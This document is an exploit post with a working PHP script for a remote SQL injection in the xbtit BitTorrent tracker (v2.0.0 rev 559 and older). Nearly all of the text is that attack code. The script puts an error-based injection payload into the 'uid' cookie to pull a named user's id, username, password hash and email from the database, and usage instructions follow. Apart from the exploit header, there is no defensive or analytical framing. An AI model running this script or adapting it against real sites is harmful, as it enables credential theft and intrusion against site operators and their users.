# Exploit Title: xBtiTracker Remote SQL Injection Vulnerability
# Date: 10.04.2010
# Author: InATeam (http://inattack.ru/) via Dominus
# Software Link: http://www.btiteam.org/
# Version: xbtit v.2.0.0 - revision 559 and older
# Tested on: xbtit v.2.0.0 - revision 559
# Code :


<?php

$id = $argv['2'];
$name = $argv['3'];
$site = $argv['1'];
if(isset($argv['3'])) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $site);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);
curl_setopt($ch, CURLOPT_COOKIE, "uid=$id+or+(1,1)=(select+count(0),concat((select+concat_ws(0x3a,id,username,password,email, 0x3a3a3a)+from+xbtit_users+where+username='$name'),floor(rand(0)*2))from(information_schema.tables)group+by+2);");
$result = curl_exec($ch);
preg_match("/(\d+:.*:[\w\d]{32}:.*):::/i", $result, $match);
printf("\nResult: %s\n", $match['1']);
}
else {
print("====================================\n
Usage: php btit.php URL ID UserName\n
Example: php btit.php http://site.com/ 2 admin\n
====================================\n");
}

?>